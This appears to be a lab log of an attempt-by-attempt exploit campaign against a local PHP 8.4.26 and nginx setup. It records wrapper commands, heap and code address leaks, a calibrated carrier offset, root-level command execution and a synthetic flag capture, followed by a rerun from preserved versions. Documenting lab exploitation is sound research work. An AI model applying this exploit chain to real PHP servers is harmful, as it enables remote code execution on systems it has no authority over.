# Attack loop — Task 001

Code changes: `CODE-CHANGES.md`.

Goal: capture the synthetic flag and stop at the first capture. The repo/Killa’s
specimen is the ground truth; consult it after a failure, not before the first method.
One bounded attempt per hypothesis. No real target. No brute force.

| # | prompt | hypothesis | command | observed | lesson | next |
|---|---|---|---|---|---|---|
| 0 | v0 | The lab is up and healthy | `make lab-up` | `php` and `nginx` healthy; telemetry up | Lab ready | 1 |
| 1 | v0 | Target the CLI server directly; the proxy is optional | `iterations/run_attempt.sh direct task001-php-1 http://127.0.0.1:8000/php-version.php` | `[health] PHP 8.4.26 confirmed`; `[abort] RemoteDisconnected`; exit 1 | The CLI server closes the producer/consumer connection. The nginx proxy is part of the exploit, not optional deployment. | 2 |
| 2a | v1 | The one-worker compose command starts the lab | `docker compose -f .../compose.yaml -f .../one-worker.yaml up -d --build php nginx` | `mkdir /home/jedi/.docker: permission denied`; no containers | Direct compose calls need `DOCKER_CONFIG=$PWD/.docker`; `make` exports it. Harness fixed. | 2b |
| 2b | v1 | Add nginx; one worker is enough for the race | `run_attempt.sh one-worker task001-nginx-1 http://127.0.0.1:8080/php-version.php` | `FileExistsError: /out/run-loop-one-worker`; exit 1 | Attempt IDs are append-only; a reused output dir fails before the attack. Use a new ID. | 2c |
| 2c | v1 | Add nginx; one worker is enough for the race | `run_attempt.sh one-worker-c task001-nginx-1 http://127.0.0.1:8080/php-version.php` | `[health] PHP 8.4.26 confirmed`; `[abort] RuntimeError: heap: expected one strict address, found 0`; exit 1 | One worker handles the producer OOM but leaves no reusable poisoned worker; the consumers find no 256-byte cookie. Four workers are required. | 3 |
| 3 | v2 | Four workers, but disable upload progress to keep the request simple | `docker compose -f .../compose.yaml -f .../verify/mutation-off.yaml up -d --build php nginx`; `run_attempt.sh upload-off task001-nginx-1 http://127.0.0.1:8080/php-version.php` | `[health] PHP 8.4.26 confirmed`; `[abort] RuntimeError: heap: producer did not return PHP 8.4.26 HTTP 200 OOM`; exit 1 | `session.upload_progress` is the trigger. With it off the producer does not OOM and there is no stale session state; the heap stage has no candidate. | 4 |
| 4a | v3 | Four workers, upload progress on; the leaked heap base is the target | `run_attempt.sh wrong-delta task001-nginx-1 http://127.0.0.1:8080/php-version.php /iterations/specimen-wrong-delta.py` | `[health] PHP 8.4.26 confirmed`; `[abort] RuntimeError: heap: expected one strict address, found 0`; exit 1 | The heap leak is a race; one heap miss does not test the carrier. Retry once before concluding. | 4b |
| 4b | v3 | Four workers, upload progress on; the leaked heap base is the target | `run_attempt.sh wrong-delta-2 task001-nginx-1 http://127.0.0.1:8080/php-version.php /iterations/specimen-wrong-delta.py` | `[health] PHP 8.4.26 confirmed`; `[heap] strict Zend base 0x7c7bcca00000`; `[abort] RuntimeError: code: expected one strict address, found 0`; exit 1 | The code leak is also a race; a code miss is not the carrier. Retry once more. | 4c |
| 4c | v3 | Four workers, upload progress on; the leaked heap base is the target | `run_attempt.sh wrong-delta-3 task001-nginx-1 http://127.0.0.1:8080/php-version.php /iterations/specimen-wrong-delta.py` | `[health]`; `[heap] 0x7c7bcca00000`; `[code] 0x619de8912930`; `final` nonce `8c8de82fc7c86b73`; `execution_proof_verified: false`; exit 1 | The heap base plus the fixed offset is not the target. The forged table lands at the wrong allocation because `HEAP_CARRIER_DELTA` is missing; the callback misses. The calibrated delta is required. | 5 |
| 5 | v4 | Apply the calibrated carrier delta/offset; use the pinned specimen | `run_attempt.sh final task001-nginx-1 http://127.0.0.1:8080/php-version.php` | `[health]`; `[heap] 0x7ea964c00000`; `[code] 0x61b9e0112930`; `final` nonce `27c3a0c37fe49e43`; `execution_proof_verified: true`; exit 0; body has `uid=0`, hash `475939…`, flag `FLAG{task001_php8426_lab_9f3c2a}` | The calibrated carrier delta/offset is the missing piece. The flag is captured; stop the attack loop. | 6 |
| 6 | v5 | Prove the flag capture and the mutations | `make verify` | static PASS; baseline PASS; live PASS attempt 3 (`run-verify-20261027T091403Z-2`, heap `0x7ea964c00000`, code `0x61b9e0112930`); mutation A PASS; mutation B PASS; `verify_exit=0` | 5/5. The pstack proof. The attack loop is done. | done |

The raw commands and full output are in `evidence/run-loop-<attempt>/attempt.log` and
`run.json`. The refined brief is `ATTACK-PROMPT.md`.

## Rerun with preserved versions (2026-10-27)

The harness versions are preserved in `versions/`; this rerun re-executed the failures
instead of reconstructing them.

| R | version | command | observed | lesson |
|---|---|---|---|---|
| R1 | v1 | `versions/run_attempt-v1.sh direct-v1 ...:8000` | `[health]`; `[abort] RemoteDisconnected`; exit 1 | Same direct-CLI failure |
| R2 | v1 | `docker compose ... versions/one-worker.yaml` without `DOCKER_CONFIG` | `mkdir /home/jedi/.docker: permission denied`; exit 1 | Same config failure |
| R3 | v2 | `versions/run_attempt-v2.sh one-worker-v2 ...:8080` | `FileExistsError: /out/run-loop-one-worker-v2`; exit 1 | Same pre-create failure |
| R4 | v3 | `versions/run_attempt-v3.sh one-worker-v3 ...:8080` | `heap: expected one strict address, found 0`; exit 1 | Same one-worker failure |
| R5 | v3 | upload-off lab; `run_attempt-v3.sh upload-off-v3 ...` | `producer did not return PHP 8.4.26 HTTP 200 OOM`; exit 1 | Same trigger control |
| R6 | v3 | `run_attempt-v3.sh wrong-delta-v4 ... /iterations/versions/specimen-wrong-delta.py` | heap `0x7cbcc9e00000`; code `0x5a3f58912930`; nonce `34f96e892217ecbd`; `execution_proof_verified: false`; exit 1 | Same carrier miss |
| R7 | v3 | `run_attempt-v3.sh final-v2 ...:8080` | heap `0x79e74b800000`; code `0x5f579df12930`; nonce `f5051bc60195565b`; `execution_proof_verified: true`; exit 0; flag | Captured again; stop |
| R8 | v3 | `make verify` | static PASS; baseline PASS; live attempt 3 `run-verify-20261027T094909Z-2` (heap `0x79e74b800000`, code `0x5f579df12930`); mutation A PASS; mutation B PASS; `verify_exit=0` | 5/5 proof |

The preserved versions are in `versions/README.md`; their hashes are in
`CODE-CHANGES.md`. The first loop's intermediate files remain lost, but the rerun's
versions are executable and reproduce the failure modes.
